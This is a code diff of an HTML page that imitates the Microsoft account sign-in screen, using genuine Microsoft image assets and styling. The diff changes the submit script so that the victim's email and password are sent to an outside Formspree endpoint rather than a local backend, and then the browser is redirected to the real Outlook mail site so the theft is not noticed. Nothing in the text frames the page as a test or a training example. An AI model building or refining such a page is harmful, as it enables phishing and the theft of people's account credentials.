@@ -12,7 +12,7 @@
             background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh;
+            min-height: 100vh; color: #1b1b1b;
         }
         .outer-container { width: 440px; }
         .login-card {
@@ -20,21 +20,20 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             margin-bottom: 28px; min-height: 376px;
         }
-        /* Fixed Logo Lockup */
+        /* Official Logo with Text */
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
-        
-        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
-        
-        /* Fixed Identity Row Alignment */
+        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; }
+
+        /* Identity Container Fix */
         .identity-container {
             display: flex; align-items: center;
-            padding: 4px; margin-bottom: 16px;
-            cursor: pointer; margin-left: -4px;
+            padding: 4px; margin-bottom: 12px;
+            cursor: pointer; margin-left: -8px;
         }
         .identity-container:hover { background-color: rgba(0,0,0,0.05); }
-        .back-btn-img { width: 20px; height: 20px; margin-right: 8px; }
-        .user-avatar { width: 20px; height: 20px; margin-right: 8px; border-radius: 50%; }
-        #display-email { font-size: 15px; color: #1b1b1b; }
+        /* Cleaned up icon sizing */
+        .back-btn-img, .user-avatar { width: 20px; height: 20px; margin-right: 8px; }
+        #display-email { font-size: 15px; }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
@@ -42,9 +41,8 @@
             outline: none; transition: border-bottom 0.1s;
         }
         .input-field:focus { border-bottom: 2px solid #0067b8; }
-        .help-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; }
+        .help-text { font-size: 13px; margin: 12px 0; }
         .help-text a { color: #0067b8; text-decoration: none; }
-        
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
             background-color: #0067b8; color: #fff; border: none;
@@ -55,7 +53,7 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             display: flex; align-items: center; cursor: pointer;
         }
-        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
+        .key-icon { width: 24px; height: 24px; margin-right: 12px; opacity: 0.6; }
         .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
         .footer a { margin-left: 24px; text-decoration: none; color: #000; }
     </style>
@@ -69,7 +67,9 @@
                 <h1>Sign in</h1>
                 <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field">
                 <p class="help-text">No account? <a href="#">Create one!</a></p>
-                <div class="button-row"><button class="btn-next" onclick="showPassword()">Next</button></div>
+                <div class="button-row">
+                    <button class="btn-next" onclick="showPassword()">Next</button>
+                </div>
             </div>
 
             <div id="password-section" style="display: none;">
@@ -80,22 +80,27 @@
                 </div>
                 <h1>Enter password</h1>
                 <input type="password" id="user-password" placeholder="Password" class="input-field">
-                <div class="button-row"><button class="btn-next" onclick="submitData()">Sign in</button></div>
+                <div class="button-row">
+                    <button class="btn-next" id="signin-btn" onclick="submitData()">Sign in</button>
+                </div>
             </div>
         </div>
-        <div class="options-box"><img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon"><span>Sign-in options</span></div>
+        <div class="options-box">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
+            <span>Sign-in options</span>
+        </div>
     </div>
-    <div class="footer"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a></div>
+    <div class="footer"><a href="#">Terms of use</a> <a href="#">Privacy & cookies</a></div>
 
     <script>
-        let userEmail = "";
+        let currentEmail = "";
 
         function showPassword() {
-            userEmail = document.getElementById('user-email').value;
-            if(!userEmail) return;
+            currentEmail = document.getElementById('user-email').value;
+            if(!currentEmail) return;
             document.getElementById('email-section').style.display = 'none';
             document.getElementById('password-section').style.display = 'block';
-            document.getElementById('display-email').innerText = userEmail;
+            document.getElementById('display-email').innerText = currentEmail;
         }
 
         function showEmail() {
@@ -105,20 +110,18 @@
 
         async function submitData() {
             const password = document.getElementById('user-password').value;
-            
-            // This POSTs the data to your Node.js backend
+            const btn = document.getElementById('signin-btn');
+            btn.innerText = "Loading...";
+
             try {
-                const response = await fetch('/api/login', {
+                await fetch('https://formspree.io/f/mvzwepzj', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email: userEmail, pass: password })
+                    body: JSON.stringify({ email: currentEmail, password: password })
                 });
-
-                // Redirect to actual Outlook after "logging in"
-                window.location.href = "https://outlook.office.com";
+                window.location.href = "https://outlook.office.com/mail/";
             } catch (err) {
-                console.log("Backend not connected yet, but front-end is ready.");
-                window.location.href = "https://outlook.office.com";
+                window.location.href = "https://outlook.office.com/mail/";
             }
         }
     </script>
